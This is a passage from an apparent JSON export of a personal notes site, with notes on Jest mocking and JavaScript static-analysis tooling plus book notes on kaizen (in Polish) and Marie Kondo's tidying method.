correct.\n\nTo do that we may use `jest.fn` _mock function_. It keeps track the parameters and how many it was called.\n\n```ts\nutils.getWinner = jest.fn((p1, p2) =\u003e p1);\n\nexpect(utils.getWinner).toHaveBeenCalledTimes(2);\nexpect(utils.getWinner).toHaveBeenCalledWith(\"Kent C. Dodds\", \"Ken Wheeler\");\nexpect(utils.getWinner).toHaveBeenNthCalledWith(\n  1,\n  \"Kent C. Dodds\",\n  \"Ken Wheeler\",\n);\nexpect(utils.getWinner).toHaveBeenNthCalledWith(\n  2,\n  \"Kent C. Dodds\",\n  \"Ken Wheeler\",\n);\n```\n\n## `jest.fn`\n\n`jest.fn` internally is a function that has some nice properties for use:\n\n- `mock`\n  - `calls` - an array that holds all of the args that the function was called with\n\nLast 3 assertions could be rewritten as one:\n\n```ts\nexpect(utils.getWinner.mock.calls).toEqual([\n  [\"Kent C. Dodds\", \"Ken Wheeler\"],\n  [\"Kent C. Dodds\", \"Ken Wheeler\"],\n]);\n```\n\nThis could be implemented this way:\n\n```ts\ntype MockFnType = { mock: { calls: any[] } };\n\nfunction fn(impl) {\n  const mockFn: MockFnType = (...args) =\u003e {\n    mockFn.mock.calls.push(args);\n    return impl(args);\n  };\n  mockFn.mock = { calls: [] }; // this implementation saves each call in the array\n  return mockFn;\n}\n\n// usage\nutils.getWinner = fn((p1, p2) =\u003e p1);\n```\n\n## `jest.spyOn`\n\nWe can use `jest.spyOn` to avoid keeping track of the original implementation (`const originalGetWinner = utils.getWinner`) and cleaning up after the test case (`utils.getWinner = originalGetWinner`) on our own.\n\n```ts\njest.spyOn(utils, \"getWinner\"); // spying on the original implementation\nutils.getWinner.mockImplementation((p1, p2) =\u003e p2);\n\nutils.getWinner.mockRestore(); // cleanup\n```\n\nThis could be implemented this way:\n\n```ts\ntype MockFnType = {\n  mock: { calls: any[] };\n  mockImplementation: (any) =\u003e any;\n};\n\nfunction fn(impl = (args: any[]) =\u003e {}) {\n  const mockFn: MockFnType = (...args: any[]) =\u003e {\n    mockFn.mock.calls.push(args);\n    return impl(args);\n  };\n  mockFn.mock = { calls: [] };\n  mockFn.mockImplementation = (newImpl) =\u003e (impl = newImpl); // saving the mocked implementation\n  return mockFn;\n}\n\nfunction spyOn(obj: any, property: string) {\n  const originalProperty = obj[property]; // track original value, function\n\n  obj[property] = fn();\n  obj[property].mockRestore = () =\u003e (obj[property] = originalProperty); // adding a way to \"release the mock\"\n}\n```\n\nUp to this point we still were doing something only just slightly more sophisticated to [[course-notes/testing-javascript/mocking#Monkey patching|monkey patching]]. It works only because we're using CommonJS. In ES modules monkey patching does not work.\n\n## `jest.mock`\n\n`jest.mock` returns a mocked implementation of a whole module.\n\n```ts\njest.mock('../utils', () =\u003e { // first arg: relative path to the mocked module\n  // second arg: module factory function\n  return {\n      getWinner: jest.fn((p1, p2) =\u003e p1);\n  }\n});\n\n// cleanup\nutils.getWinner.mockReset();\n```\n\n`.mockReset()` will reset our mock function to the initial state clearing out the `calls`.\n\n`jest.mock` works, because Jest is in control of the whole module system.\n\n\u003e [!tip] Jest hoists the `jest.mock` call to the top of the file, before imports.\n\u003e\n\u003e We don't have to do it manually.\n\nThis is how we can implement it on our own by using `require.cache`.\n\n```ts\nconst utilsPath = require.resolve(\"../utils\");\n\ntype MockFnType = {\n  mock: { calls: any[] };\n  mockImplementation: (any) =\u003e any;\n};\n\nfunction fn(impl = (...args: any[]) =\u003e {}) {\n  const mockFn: MockFnType = (...args: any[]) =\u003e {\n    mockFn.mock.calls.push(args);\n    return impl(...args);\n  };\n  mockFn.mock = { calls: [] };\n  mockFn.mockImplementation = (newImpl) =\u003e (impl = newImpl);\n  return mockFn;\n}\n\n// @ts-ignore missing properties\nrequire.cache[utilsPath] = {\n  id: utilsPath,\n  filename: utilsPath,\n  loaded: true,\n  exports: {\n    getWinner: fn((p1, p2) =\u003e p1),\n  },\n};\n\ndelete require.cache[utilsPath]; // cleanup\n```\n\nThis is something similar, yet simplified version of what Jest is doing.\n\n## Mocking a module shared across the codebase\n\nUse `__mocks__` directory.\n\n```sh\n$ tree\n├── __mocks__\n│   └── utils.ts\n└── utils.ts\n```\n\nThen in test file:\n\n```ts\njest.mock(\"../utils\");\n```\n\n`jest` knows to pick up the path from __mocks__ directory. \n","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/testing-javascript/static-analysis":{"title":"Static Analysis","content":"\n*Static analysis* is a method of debugging that is done by automatically examining the source code **without having to execute the program** with tools like `eslint`, `prettier`, `typescript`, `husky`.\n\n## ESLint\n\n- use `ESLint` extension (by Dirk Baeumer) for VS Code\n  - `⌘ + .` provides hints on how to fix the issues\n- `eslint` provides a set of recommended rules that can be _extended_:\n\n```json\n// .eslintrc\n{\n  \"extends\": [\"eslint:recommended\" /* another extension */],\n  \"rules\": {\n    // overrides to extended configurations\n  }\n}\n```\n\n- instead of using `.eslintignore` which is oftenly exactly the same as `.gitignore`, add the flag to `npm script` :\n  - `eslint --ignore-path .gitignore .`\n\n## Prettier\n\n- `--ignore-path .gitignore` is supported in Prettier as well\n- there's a Prettier [Playground](https://prettier.io/playground) in which we can experiment with the configuration and save it to `.prettierrc`\n- use Prettier extension (by Esben Petersen) for VSCode with these options:\n  - `editor.defaultFormatter: \"esbenp.prettier-vscode\"`\n  - `editor.formatOnSave: true`\n- disable unnecessary ESLint rules with `eslint-config-prettier` extension to make sure Prettier and ESLint won't clash\n- `prettier` has a `--list-different` flag used when you want to throw an `Error` if the formatting sucks\n\n## `yarn`\n\n```json\n{\n  \"scripts\": {\n    \"prettier\": \"prettier --ignore-path .gitignore \",\n    \"format\": \"npm run prettier -- --write\"\n    /** \n    `--` makes yarn to use the parameters of \n    `prettier` script without rewriting them \n    effectively making the `format` script: \n    \n    \"format\": \"prettier --ignore-path .gitignore --write\" */\n  }\n}\n```\n\n## TypeScript tips\n\n- **use TypeScript**, at least for types analysis (if you can't for compiling for some reason)\n- use `@typescript-eslint/eslint-plugin` and `@typescript-eslint/parser` for `*.ts(x)` files\n\n## Husky\n\n- use `precommit` hooks to statically analyze the codebase\n- Husky can be integrated with `lint-staged` for those who don't use editor with Prettier/ESLint plugins\n\n## `npm-run-all`\n\n`npm-run-all` is a tool that allows to run `npm` scripts in parallel:\n\n```json\n{\n  \"scripts\": {\n    \"build\": \"/* ... */\",\n    \"check-format\": \"/* ... */\",\n    \"check-types\": \"/* ... */\",\n    \"lint\": \"/* ... */\",\n    \"validate\": \"npm-run-all check-types check-format lint build\" // \u003c--\n  }\n}\n```\n","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/web/":{"title":"Web development","content":"","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/web/glossary/DOM":{"title":"Document Object Model","content":"\n_Document Object Model_ is a programming interface for HTML and XML documents.

However, because of that, occasionally things might be broken (e.g. _last-updated_ feat is not working as of now).\n","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/reading/":{"title":"Reading","content":"\nHere's the **absolutely incomplete** list of what I've read so far.

Małymi krokami ku doskonałości 🇵🇱","content":"By Robert Maurer. 3/5.\n\n\u003e An introduction to the method of small steps. Too long for such a tiny topic. Wasn't as informative as I thought. \n\n\n## Innowacja\n\nSłowa _innowacja_ używa się powszechnie jako _dokonanie przełomu_. W biznesie - _drastyczna zmiana_ (która w idealnych warunkach trwa krótko, wywołując ogromne zmiany jednocześnie; szokująca, radykalna zmiana), np.\n\n- masowe zwolnienie (trwa krótko), nagła konieczność restrukturyzacji\n- zainwestowanie hajsu w startup (trwa krótko), ogromny zysk\n  (ale też poza biznesem)\n- rzucanie nałogu _cold-turkey_\n- radykalny plan na pozbycie się długu\n\nRadykalne zmiany mogą spowodować słomiany zapał.\n\n## _kaizen_\n\nW biznesie: Przeciwieństwo [[books/book/kaizen#Innowacja|innowacji]]. Dosłownie: metoda ustawicznego poprawiania procesu procesu zarządzania i produkcji na każdym jego szczeblu, just-in-time.\n\n- Każdy pracownik może zgłosić pomysł na poprawienie procesu\n- Bez oceniania\n  W życiu: W miarę wygodne, drobne kroki w stronę rozwoju. _Metoda małych kroków_\n\n\u003e \"Nawet najdłuższa podróż zaczyna się od jednego kroku\".  \n\u003e —Lao Cy\n\n## Dlaczego Kaizen?\n\nZmiany z dnia na dzień są drobne i wykonalne niemal bez wysiłku (sprzyjające środowisko). W długim czasie doprowadzają do ogromnej zmiany.\n\nMałe kroki kaizen:\n\n- wyłączają/oszukują mechanizm lęku (walka/ucieczka) przed ogromnymi zmianami\n  - mechanizm lęku: śródmózgowie-\u003eciało migdałowate; reakcja walki lub ucieczki, uruchamiany gdy chcemy nagle wdrożyć zmianę ([[books/book/kaizen#Innowacja|innowację]]).\n    - Nagła zmiana zawsze wywołuje strach\n    - Reakcja mózgu jest automatyczna\n      - bardziej świadoma część mózgu (kora mózgowa) może zostać _zablokowana_\n- stymulują racjonalne podejście i twórcze myślenie\n- tworzą nowe połączenia nerwowe budując jednocześnie nowe nawyki\n- zaspokajają potrzebę by _iść do przodu_ i osłabiają stres\n- wysiłek jest niemal niezauważalny\n  - zwłaszcza gdy wykonanie zadania jest przyjemne i powoduje dumę\n\n## Oczekuj strachu\n\nStrach ostrzega przed wyzwaniem, oznacza ambicję, wzmacnia nadzieję. Im więcej odczuwamy strachu, tym bardziej się o coś troszczymy.\n\nOczekując strachu możesz podejść do problemu na spokojnie.\n\n## Małe pytania\n\nMózg uwielbia pytania. Pytania typu \"jak mam schudnąć 25kg w 2 tygodnie\" są trudne i budzą ogromny lęk. Pytając **\"jakie najmniejsze kroki mogę podjąć by poprawić swoje zdrowie?\"** tego lęku nie budzą:\n\n- co mogę robić 5 minut dziennie aby poprawić swój budżet/zdrowie/relacje?\n\nPo czasie mózg zacznie odpowiadać skutecznymi pomysłami - ciało migdałowate spoczywa, a kora mózgowa może się wykazać.\n\nWymagają spokoju i cierpliwości. Należy zadawać sobie pytania regularnie, tak długo jak jest to konieczne aby mózg odpowiedział.\n\n- tracimy kontrolę nad samym procesem zmiany i nie możemy określić momentu w którym osiągneliśmy cel, tak jak nie możemy powiedzieć **kiedy** opanowaliśmy jazdę samochodem czy grę na gitarze\n\nNależy pytać o pozytywy (zamiast _dlaczego jestem taki gruby?_ zapytać *co małego mi się dziś w sobie podoba?*).\n\nMałe pytania mogą [[quotes/robert-maurer-on-humour|wydawać się śmieszne]], ale przynajmniej nie wzbudzają negatywnej reakcji, lęku.\n\nZnakiem, że można iść dalej, jest wykonywanie poprzedniego kroku automatycznie, bez wysiłku i nawet z przyjemnością.\n\n### Przykłady\n\n- Perry Spencer - mikrofalówka\n  - zostawił batonika obok radaru\n  - zapytał \"Dlaczego radar stopił batonika\"\n  - zadawał kolejne małe pytania\n  - mikrofalówka\n- kogo mogę poprosić o pomoc?\n- w jaki jak najmniejszy sposób mogę poprawić swoją dietę?\n- co mogę zrobić aby choć odrobinę poprawić swoje relacje z klientem?\n- jaką jedną rzeczą mój mąż mnie uszczęśliwia?\n- co mogę zrobić aby w małym stopniu przybliżyć się do swojego celu?\n- z kim dawno nie rozmawiałem?\n- co mogę dobrego powiedzieć o _tej_ osobie?\n\nOdpowiedzi warto zapisywać w [[books/book/kaizen/dziennik|dzienniku]] (lub w innej formie).\n\n## Rzeźbienie umysłu\n\nPolega na _udawaniu czynności_ w wyobraźni. Przydatne w realizowaniu trudnych przedsięwzięć.\n\nMózg nie rozumie różnicy pomiędzy rzeczywistością, a światem wyobraźni. Wykonując _trening_ (wyobrażając sobie ćwiczenie), nadal wpływam na chemię organizmu. Nadal tworzą się połączenia neuronowe.\n\n1. Wybierz zadanie (budzące lęk lub dyskomfort)\n2. Zdecyduj przez ile czasu dziennie chcesz _rzeźbić_ umysł (w sekundach).\n   - czas musi być dobrany tak, aby nie było kłopotliwym wykonać zadanie **codziennie**\n3. Wykonuj ćwiczenie w cichym i wygodnym miejscu.\n4. Wyobraź sobie trudną sytuację, wyzwanie.\n   - \\_Co widzisz? Co Cię otacza? Kto się tam znajduje? Jak wygląda?\\_\\_ Postaraj się zobaczyć wyraz twarzy innych ludzi, ich ubrania, posturę.\n   - Wyobrażaj sobie także zapachy, smaki, dźwięki\n5. Wyobraź sobie wykonywanie zadania\n   - użyte słowa, ton głosu, uczucie trzymania przedmiotu itp.\n6. Wyobraź sobie pozytywny _outcome_ w reakcji na wykonanie zadania\n   - wystąpienie publiczne -\u003e wpatrzone z ciekawością oczy publiczności, szmer notowania itd.\n7. Wykonaj zadanie kiedy już poczujesz się na siłach po mentalnym treningu\n\n## Postanowienia noworoczne - przykłady\n\n- Zdrowe odżywianie\n  - _wyrzucaj_ pierwszy kęs tuczącej przekąski przez miesiąc\n  - _wyrzucaj_ dwa pierwsze w kolejnym miesiącu\n  - w trzecim - trzy kęsy\n  - skoncentruj się na tym by jeść wolniej i być bardziej skupionym na jedzeniu\n- Ćwiczenia\n  - używaj zaciskacza podczas oglądania TV\n  - wykonuj przez jakiś czas jedną pompkę dziennie\n  - przejdź jedno piętro piechotą zamiast użyć windy\n  - zadaj sobie pytanie _jaka mała aktywność sprawi mi przyjemność_ (bieganie, rower czy basen)\n- Oszczędzanie\n  - odkładaj 5zł dziennie\n    - np. zastępując kawę mniejszą\n  - raz dziennie wymyśl sposób na wydanie zaoszczędzonych pieniędzy\n    - znajdziesz większą motywację by oszczędzać zamiast korzystać z małych przyjemności\n- Produktywność\n  - spisz rzeczy, które pożerają czas\n  - spisz rzeczy, które wg ciebie są bardziej produktywne. Każdego dnia dodawaj jedną rzecz do listy\n  - kiedy poczujesz, że chcesz wypróbuj jedną z nich w stylu [[books/book/kaizen#_kaizen_|kaizen]]\n\n## Rozwiązywanie problemów\n\nRozwiązuj problemy jak tylko się pojawią\n\n- [[quotes/the-minimalists-on-procrastination|bez prokrastynacji]]\n- jesteśmy przyzwyczajeni do małych problemów dlatego nie rozwiązujemy _drobnych niedogodności_\n  - zgodnie z [[books/book/kaizen/teoria rozbitych okien|teorią rozbitych okien]]\n- a przecież są mogą one być *znakami ostrzegawczymi*\n  - zastanów się czy przy ostatnim, _dużym_ problemie pojawiły się wcześniej jakieś małe znaki ostrzegawcze\n  - zastanów się co pomogło rozwiązać ten problem\n\nZadawaj sobie [[books/book/kaizen#Małe pytania]] aby nauczyć się rozwiązywać problemy zawczasu\n\n- _jaki krok mogę podjąć, żeby poprawić sytuację?_\n- _czy małe problemy wykazują tendencję do rozwoju?_\n- _czy mogę osadzić problem w szerszym kontekście?_\n\nNigdy nie zakładaj, że _systemy_ będą działać niezawodnie (jeżeli coś może pójść źle, to tak się stanie; _prawo Murphy'ego_).\n\nNie reaguj gniewiem. Odpowiadając gniewem na życiowe wyzwania masz siedmiokrotnie wyższą szansę zapadnięcia na choroby serca niż ludzie prowadzący identyczny styl życia, lecz o innym temperamencie.\n\nKorzystaj ze swojej wewnętrznej mądrości. Zareaguj na drobne, przejmujące uczucie, że _coś jest nie tak_.\n\n## Nagrody\n\nNagradzaj się za kolejne kroki.\n\nKorzystaj z **małych nagród**.\n\nMałe nagrody są optymalne ponieważ wykorzystują jedną z zasad ludzkiej natury: im większa nagroda zewnętrzna, tym większa jest też szansa, że osłabi lub stłumi wrodzone dążenie do doskonałości.\n\n- większe nagryody redukują wewnętrzną motywację na rzecz zewnętrznej.\n- w środowisku korporacyjnym duże nagrody pieniężne mogą sugerować, że pracownik jest trybikiem w maszynie i musi być zachęcany do działania wyłącznie obietnicami osobistego zysku\n- małe nagrody są formą uznania i docenienia potrzeby rozwoju i wkładu osobistego\n\n### Przykłady\n\n- podziękowanie\n- uczciwa uwaga na swój temat (np. gdy problemem jest walka z krytycyzmem)\n- małe i drobne _prezenty_\n\n## Małe momenty\n\n_Kaizen_ wymaga wolniejszego tempa. Dostrzeganie małych momentów (zachwytów nad codziennością) uczy życia _tu i teraz_.\n\nWiele przełomowych dokonań wynikło bezpośrednio z cierpliwej, codziennej obserwacji małych zjawisk.\n\n### w związkach\n\nW szczęśliwych małżeństwach przejawy pozytywnego stosunku do partnera występują pięć razy częściej niż przejawy negatywne. Docenia się takie małe gesty jak:\n\n- mówienie spokojnym głosem po otrzymaniu telefonu od partnera\n  - przeciwstawne podenerwowaniu czy szybkiej rozmowie sugerującej, że telefon przerwał wykonywanie ważnych zadań\n- pytanie o szczegóły z dnia drugiej osoby\n- odkładanie telefonu, gdy partner wchodził do pokoju\n- wracanie do domu o umówionej godzinie\n  - albo przynajmniej zawiadamianie o planowanym spóźnieniu.\n- koncentrowanie się na zaletach partnera, zamiast na wadach\n\nMałe momenty pozwalają drugiej osobie odczuć troskę i opiekę. Pozwala odczuć bycie kochanym za to jakim się jest, a nie za to co się robi.\n\n## Podsumowanie\n\nPiękno kaizen i jego wyzwanie polega jednak na tym, że wymaga ono wiary w siłę ciała i umysłu. Podejmując małe kroki, ustawiasz swój wewnętrzny kompas na nowy azymut i pozwalasz, by umysł zajął się resztą.\n\nZamiast agresywnie zmuszać się do \"wojskowego\" myślenia o zmianie, pozwól, by umysł dokonywał skoków we własnym tempie.\n\nPatrz na kaizen jako na proces, który nigdy się nie kończy, postrzegania życia w kategoriach okazji do ustawicznego rozwoju, ciągłego podnoszenia poprzeczki oraz rozwijania własnego potencjału.\n\nBo co może być ważniejszego w życiu niż wyciąganie możliwości z każdej mijającej chwili?\n","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/reading/notes/lifechanging-magic-of-tidying-up":{"title":"The Life-changing Magic of Tidying Up","content":"By Marie Kondo. **5/5**. [Amazon](https://www.amazon.com/Life-Changing-Magic-Tidying-Decluttering-Organizing/dp/1607747308).\n\n\u003e Lessons from this one (and from [this Netflix's piece](https://www.netflix.com/pl-en/title/80209379)) helped us to _throw out_ ~15 bags of clutter right before our kiddo was born. I had to mentally skip the metaphysical BS though. Remarkable piece.\n\n## How to declutter?\n\u003e [!tip] Tip\n\u003e \n\u003e According to the author it should be enough to do it once in a lifetime, but my experience is that it's good to do it every now and then (like during the moving out, after a kid is born etc.). \n\nDeclutter the whole house at once. Occasional tidying up won't change your relationship with possessions and the clutter will find its way back into your life.\n\nGo through your possessions by category - items belonging to one category may lie in different locations. Put them in one place (e.g. on bed) to see how much of them you have. \n\nGrab every item and decide if you want to keep it. Focus on **its purpose**, **why you have it** and __if it brings you _joy___. If it doesn't serve any purpose and you don't need it anymore, remove it from your life immediately.\n\nDon't listen to music or watch Netflix _in the meantime_ etc. **Focus on cleaning up** not only the space but also the _mental space_ the items take in your life.\n\nDo it in this order:\n- clothes (you may split them into subcategories like jackets, t-shirts if you want) \n- books\n- paperology\n- _komono_ (others)\n- things of emotional value and memorabilia\n\nKeeping this order also makes decluttering easier, allows to gain the momentum and teaches how to make the decisions for later.\n\n### Clothes\nLeave only the clothes you wear. Don't keep the items to _use them at home when no-one looks_. You look.\n\nFold the foldables whenever possible (eg. trousers), hang the clothes that look better hanged (eg. shirts). \n\n\u003ciframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/IjkmqbJTLBM\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen\u003e\u003c/iframe\u003e\n\nKeep the clothes of the same category in the same place. Also, try to keep them from _heavier_ to _lighter_ (in terms of the material and color). \n\nWhenever it's possible, don't divide clothes by seasons - the simpler categorisation, the better. You ain't taxonomist.\n\nMake all the clothes accessible to you at any given moment. Don't keep them in the backs of your closet, it will wrinkle them. And you won't enjoy them oftenly.\n\nKeep the lighter colors in front of the drawer.\n\n### Books\nDon't open them during decluttering. If you think you will read a particular book at some point, you probably won't. The same applies to already read books. Keep only your personal bests. \n\n### Paperology\nYou don't need the papers that are not actionable right now, or you don't have to keep them for external reasons (e.g. tax stuff). Keep the papers in one place, a cabinet, drawer or a binder.\n\nIf there is something you'd like to keep, but it doesn't have to be in physical form for legal reasons, scan it and keep it in the cloud. \n\n### _Komonos_\nDon't keep items _just because_. If they don't bring you joy or don't serve any purpose, just let them go away.\n\n#### Gifts\nIf you don't like something you got, throw it away. The reason for someone to get you something is for you to accept it. It's a way of sharing love. Sometimes you won't enjoy the gift and that's ok. \n\n#### Electronics and cables\nKeep as many cables as you need and nothing more. You don't need cables for that old 2MP camera from 2001.\n\nDon't keep the broken electronics at home. Probably you won't be able to fix them on your own, and if you didn't already, you won't ask anyone to do that for you either. \n\n#### Boxes\nFor most of your belongings you don't need to keep the boxes that they come in. Only in rare occasions lack of the box would affect the price if you'd want to sell the item. \n\n#### Others\nCoins should be in the wallet or the savings jar. The shopping bags (well, every kind of bags) can sit in one of them. Necessary kitchen appliances should be hidden in the drawers. Etc, etc. \n\n### Memorabilia\nJust keep in mind who you are right now, not who you were back then, or who was part of your life in the past. This will tell you what you want to remove. \n\n## How to store things?\nOnce you're done with eliminating, think of where to put the things that you want in your life.\n\nFind a home for every item you have. By the _home of an item_ the author means the its place. If this rule is violated, the house will be cluttered in no time.\n\nThe simpler the storage system, the better. Having a sophisticated solution needs maintenance. Also, the more you need to think of where to put an item, the higher chance of putting it anywhere. \n\nExperts in organizing things are hoarders. \n\nKeep the same items close. Ideally vertically, not stacked. Items at the bottom of the stack are more difficult to get, they disappear from your sight. \n\n## How to buy stuff\nAsk yourself if buying the particular item will bring you the joy. If you can - buy the used items but in a decent condition. \n\nThrow away boxes, remove label tags. Treat your new things **as yours**. \n\n## Day to day decluttering\nSpend few minutes every day to put the items where they belong. Simple as that. You won't have to think about clutter anymore. \n\n## Resources\n- [Talk about this book @ ThePodcast.fm](http://thepodcast.fm/episodes/146)","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null}}
